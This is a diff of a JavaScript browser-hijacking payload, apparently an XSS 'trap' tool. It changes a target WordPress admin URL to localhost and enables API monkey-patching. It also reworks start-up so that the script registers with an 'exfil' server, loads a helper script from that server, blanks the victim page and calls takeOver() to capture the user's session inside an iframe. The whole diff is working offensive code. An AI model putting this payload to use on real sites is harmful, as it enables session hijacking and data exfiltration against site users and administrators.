@@ -29,8 +29,8 @@ function initGlobals()
 	// load the page the user was on in the iframe
 	// when they reloaded the page. Otherwise,
 	// they'll start here
-	window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
-	//window.taperstartingPage = "https://127.0.0.1:8443/";
+	//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
+	window.taperstartingPage = "https://127.0.0.1:8443/";
 
 
 
@@ -42,7 +42,7 @@ function initGlobals()
 
 	
 	// Should we try to monkey patch underlying API prototypes?
-	window.monkeyPatchAPIs = false;
+	window.monkeyPatchAPIs = true;
 
 
 	// Helpful variables
@@ -729,56 +729,47 @@ function takeOver()
 //if (sessionStorage.getItem("taperClaimDebug")===null)
 if (window.taperClaimDebug != true)
 {
-	//sessionStorage.setItem("taperClaimDebug","optional");
 	window.taperClaimDebug = true;
-	//localStorage.setItem('trapLoaded', 'true');
-
-	// window.addEventListener("visibilitychange", function(e){
-	// 	cleanup();
-	// });
-	// window.addEventListener("beforeunload", function(e){
-	// 	cleanup();
-	// });
-
-	
 	initGlobals();
 
-	console.log("!!!! Loading payload!");
-// Blank the page so it doesn't show through as users 
-// navigate inside the iframe
-	document.body.innerHTML = "";
-	document.body.outerHTML = "";
-
-
-// Pull in html2canvas
-	var js = document.createElement("script");
-	js.type = "text/javascript";
-	js.src = taperexfilServer + "/lib/telemhelperlib.js";
-
-	this.temp_define = window['define'];
-	document.body.appendChild(js);
-	window['define'] = undefined;
-
-	// document.body.appendChild(js);
-	// document.write('<script type="text/javascript" src="http://localhost:8444/lib/telemhelperlib.js"></script>');
-	console.log("HTML2CANVAS added to DOM");
-
-
-
-// Get our client UUID
+	// Get our client UUID
 	request = new XMLHttpRequest();
-	request.open("GET", taperexfilServer + "/client/getToken", true);
+	request.open("GET", window.taperexfilServer + "/client/getToken", true);
 	request.send(null);
 
 	request.onreadystatechange = function()
 	{
 		if (request.readyState == XMLHttpRequest.DONE)
 		{
-			var jsonResponse = JSON.parse(request.responseText);
-    		window.taperSessionUUID = jsonResponse.clientToken;
+			if (request.status == 200)
+			{
 
-    		// We're ready to trap all the things now
-    		takeOver();
+				// We have a session, start taking over
+
+				// Pull in html2canvas
+				var js = document.createElement("script");
+				js.type = "text/javascript";
+				js.src = taperexfilServer + "/lib/telemhelperlib.js";
+
+				this.temp_define = window['define'];
+				document.body.appendChild(js);
+				window['define'] = undefined;
+				console.log("HTML2CANVAS added to DOM");
+
+				// Blank main page
+				document.body.innerHTML = "";
+				document.body.outerHTML = "";
+
+				var jsonResponse = JSON.parse(request.responseText);
+				window.taperSessionUUID = jsonResponse.clientToken;
+
+    			// We're ready to trap all the things now
+				takeOver();
+			}
+			else
+			{
+				console.log("No client session received, skipping");
+			}
 		}
 	}
 }
